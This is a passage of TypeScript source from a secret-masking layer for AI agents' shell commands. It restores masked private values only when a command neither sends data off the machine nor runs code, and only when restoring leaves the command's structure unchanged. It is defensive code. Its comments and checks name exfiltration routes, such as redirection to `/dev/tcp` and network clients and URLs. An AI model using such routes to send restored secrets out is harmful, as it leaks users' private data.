      if (keepAll || verdict.programAt.has(at)) return false;
      const context = verdict.contextAt.get(at) ?? 'none';
      // Glued to a redirection in shell code (`{{…}}>notes.md`), a value of
      // digits would become its file descriptor.
      if (context === 'none' && gluedToRedirection(command, at)) return false;
      return shellSafe(value, context);
    },
    shifts,
  );
  if (restored.results.every((r) => r.replacements === 0)) return restored;
  // The values must not change what the command is: one restored as a
  // redirection to `/dev/tcp/…`, a URL, or a word that makes a program
  // run code keeps every placeholder, and so does one that changes how
  // the command splits.
  const after = judge(restored.command, []);
  const same = sameLayout(verdict.layout, after.layout, shifts);
  if (same && !after.offMachine && !after.runsCode) return restored;
  return restoreEach(np, command, sessionId, () => false);
}

/** True when the placeholder at `at` is followed by `<` or `>`, directly
 * or after digits: a value of digits would join them into the descriptor
 * number (`{{…}}2>err.log` with `1` is `12>err.log` in bash). */
function gluedToRedirection(command: string, at: number): boolean {
  const placeholder = new RegExp(PLACEHOLDER_REGEX.source, 'y');
  placeholder.lastIndex = at;
  if (!placeholder.test(command)) return false;
  const operator = /\d*[<>]/y;
  operator.lastIndex = placeholder.lastIndex;
  return operator.test(command);
}

/** Where restoring one placeholder changed a command's length: at `at`
 * of the masked command, `from` characters became `to`. */
interface Shift {
  readonly at: number;
  readonly from: number;
  readonly to: number;
}

/** True when `after`, read from the restored command, splits exactly as
 * `before` (read from the masked one) once its offsets are moved by
 * `shifts`. */
function sameLayout(before: Layout, after: Layout, shifts: readonly Shift[]): boolean {
  const move = offsetMover(shifts);
  const same = (
    a: ReadonlyArray<readonly [number, number]>,
    b: ReadonlyArray<readonly [number, number]>,
  ): boolean =>
    a.length === b.length &&
    a.every(([start, end], k) => move(start) === b[k]?.[0] && move(end) === b[k]?.[1]);
  return same(before.commands, after.commands) && same(before.bodies, after.bodies);
}

/** Maps an offset of the masked command to the restored one; an offset
 * inside a restored placeholder maps to `undefined`. */
function offsetMover(shifts: readonly Shift[]): (offset: number) => number | undefined {
  const delta: number[] = [0];
  for (const s of shifts) delta.push((delta.at(-1) ?? 0) + s.to - s.from);
  return (offset) => {
    // How many shifts start before `offset`.
    let lo = 0;
    let hi = shifts.length;
    while (lo < hi) {
      const mid = (lo + hi) >>> 1;
      if ((shifts[mid]?.at ?? offset) < offset) lo = mid + 1;
      else hi = mid;
    }
    const last = shifts[lo - 1];
    if (last !== undefined && offset < last.at + last.from) return undefined;
    return offset + (delta[lo] ?? 0);
  };
}

/** A shell `command` given as an argv array, with its safe placeholders
 * restored. */
export interface ShellArgvRestore {
  readonly argv: readonly string[];
  readonly results: readonly RestoreResult[];
  readonly keptMasked: readonly string[];
}

/**
 * Restore the placeholders of a `command` given as an argv array, as
 * Codex's `shell` tool sends it (`["bash", "-lc", "…"]`). The program
 * runs without a shell, but the same rules hold as in a string command:
 * - nothing is restored when the program sends data off the machine, or
 *   runs code that may;
 * - a value is restored only as one plain word, never into the program
 *   itself, and never into the arguments of `cd`, `export` and the like;
 * - the script a shell runs (`bash -lc "…"`) is judged as a string
 *   command, program positions and data heredocs included.
 *
 * @param np - the engine whose vault holds `sessionId`.
 */
export function restoreShellArgv(
  np: RestoreCapable,
  argv: readonly string[],
  sessionId: string,
): ShellArgvRestore {
  const length = argv.reduce((n, a) => n + a.length, 0);
  const offline = length <= MAX_COMMAND_CHARS && !argvSendsOffMachine(argv);
  const program = argvProgramIndex(argv);
  const script = shellScriptIndex(argv, program);
  // A program that runs code gets values back only inside the script a
  // shell runs, which is judged as a string command; nowhere else.
  const runs = argvProgram(argv);
  const code = argvRunsCode(argv) || runs === undefined || !takesDataArgs(runs);
  // As in shell code, the arguments of `cd`, `export` and the like get no
  // value.
  const name = runs?.name ?? '';
  const held = name === 'cd' || ENVIRONMENT_BUILTINS.has(name);
  const first = restoreArgvWords(
    np,
    argv,
    sessionId,
    (position, value) => {
      if (!offline || position === program || position === 0) return false;
      if (code || held) return false;
      return PLAIN_WORD.test(value);
    },
    offline ? script : -1,
  );
  if (first.results.every((r) => r.replacements === 0)) return first;
  // As for a string command: the values must not change what it is.
  if (!argvSendsOffMachine(first.argv) && (code || !argvRunsCode(first.argv))) return first;
  return restoreArgvWords(np, argv, sessionId, () => false, -1);
}

/** Restore each word of `argv`: the shell script at `script` as a string
 * command, every other word where `safe` accepts the value. */
function restoreArgvWords(
  np: RestoreCapable,
  argv: readonly string[],
  sessionId: string,
  safe: (position: number, value: string) => boolean,
  script: number,
): ShellArgvRestore {
  const results: RestoreResult[] = [];
  const keptMasked: string[] = [];
  const restored = argv.map((word, position) => {
    const r =
      position === script
        ? restoreShellCommand(np, word, sessionId)
        : restoreEach(np, word, sessionId, (value) => safe(position, value));
    results.push(...r.results);
    keptMasked.push(...r.keptMasked);
    return r.command;
  });
  return { argv: restored, results, keptMasked };
}

/** Shells whose `-c` argument is a script. */
const ARGV_SHELLS: ReadonlySet<string> = new Set(['bash', 'sh', 'zsh', 'dash', 'ksh', 'mksh']);
/** The standard directories a shell named by path may sit in. */
const ARGV_SHELL_DIR = /^(?:\/usr)?\/bin\//;
/** A shell option cluster that holds `c`: the next argument is the script. */
const SCRIPT_FLAG = /^-[A-Za-z]*c[A-Za-z]*$|^--command$/;
/** Shell options that take the next argument (`-o pipefail`, `+O extglob`). */
const OPTION_WITH_ARGUMENT = /^[-+][A-Za-z]*[oO]$|^--(?:rcfile|init-file|init-command)$/;

/** The index of the program an argv array runs, past wrappers (no
 * shell reads it: no word is an assignment or a redirection). */
function argvProgramIndex(argv: readonly string[]): number {
  const words = argv.map((text) => ({ text, bare: 0, start: 0, end: text.length }));
  let k = skipPrefix(words, 0);
  for (;;) {
    const text = words[k]?.text;
    if (text === undefined) return k;
    const name = normalise(text);
    const options = WRAPPERS.get(name);
    if (options === undefined) return k;
    k = skipWrapperArgs(words, k + 1, name, options).next;
  }
}

/** The index of the script a shell program runs with `-c`, or -1. */
function shellScriptIndex(argv: readonly string[], program: number): number {
  const name = argv[program];
  // A POSIX shell, first and named as written (or in `/bin`, `/usr/bin`):
  // a wrapper, another path (`./bash`), case or version suffix could run
  // another program, and `fish` quotes differently.
  if (program !== 0 || name === undefined) return -1;
  if (!ARGV_SHELLS.has(name.replace(ARGV_SHELL_DIR, ''))) return -1;
  for (let k = program + 1; k < argv.length; k++) {
    const word = argv[k] ?? '';
    if (SCRIPT_FLAG.test(word)) return k + 1;
    if (OPTION_WITH_ARGUMENT.test(word)) k += 1;
    else if (!word.startsWith('-') && !word.startsWith('+')) return -1;
  }
  return -1;
}

/** The program an argv array runs, every word literal. */
function argvProgram(argv: readonly string[]): Program | undefined {
  return programOf(argv.map((text) => ({ text, bare: 0, start: 0, end: text.length })));
}

function argvRunsCode(argv: readonly string[]): boolean {
  const program = argvProgram(argv);
  return (
    (program !== undefined && runsCode(program)) || argv.some((a) => NESTED_INTERPRETER.test(a))
  );
}

/** True when an argv command sends data out: its program does, an
 * argument names a network client, or it runs code (each argument then
 * read as a shell command) that does. */
function argvSendsOffMachine(argv: readonly string[]): boolean {
  const program = argvProgram(argv);
  if (program !== undefined && sendsOut(program)) return true;
  if (program !== undefined && ANY_DELIMITER_PROGRAMS.has(program.name)) return true;
  // The script a shell runs is judged as a string command, which skips a
  // heredoc body written out as data (a commit message that mentions
  // `ssh`); every other word is read whole.
  const script = shellScriptIndex(argv, argvProgramIndex(argv));
  if (script >= 0 && sendsOffMachine(argv[script] ?? '')) return true;
  const words = argv.filter((_, k) => k !== script);
  if (words.some((a) => ANY_DELIMITER_IN_TEXT.test(a))) return true;
  if (words.some((a) => NETWORK_CLIENT.test(a))) return true;
  // As in a string command: a URL handed to a program that is not a data one.
  if (words.some((a) => URL_SCHEME.test(a)) && !(program !== undefined && isDataProgram(program))) {
    return true;
  }
  if (!argvRunsCode(argv)) return false;
  return words.some((a) => NETWORK_IN_CODE.test(a) || sendsOffMachine(a));
}

/** Restore each placeholder of `text` whose real value `safe` accepts at
 * the placeholder's index; leave the others literal. Each value put back
 * is noted in `shifts`, when given. */
function restoreEach(
  np: RestoreCapable,
  text: string,
  sessionId: string,
  safe: (value: string, at: number) => boolean,
  shifts?: Shift[],
): ShellRestore {
  const results: RestoreResult[] = [];
  const keptMasked: string[] = [];
  let out = '';
  let last = 0;
  for (const match of text.matchAll(placeholderPattern())) {
    const start = match.index;
    const placeholder = match[0];
    const r = np.restore(placeholder, sessionId);
    const ok = r.replacements === 0 || safe(r.restored, start);
    if (ok) results.push(r);
    else keptMasked.push(placeholder);
    if (ok && r.replacements > 0) {
      shifts?.push({ at: start, from: placeholder.length, to: r.restored.length });
    }
    out += text.slice(last, start) + (ok ? r.restored : placeholder);
    last = start + placeholder.length;
  }
  return { command: out + text.slice(last), results, keptMasked };
}

/** How many placeholders `text` holds. */
export function countPlaceholders(text: string): number {
  return placeholdersIn(text).length;
}

/** The placeholders `text` holds, in order, once per occurrence. */
export function placeholdersIn(text: string): string[] {
  return [...text.matchAll(placeholderPattern())].map((m) => m[0]);
}

/** A fresh global copy: `matchAll` needs the `g` flag, and a shared
 * global regex would carry `lastIndex` between callers. */
function placeholderPattern(): RegExp {
  return new RegExp(PLACEHOLDER_REGEX.source, 'g');
}
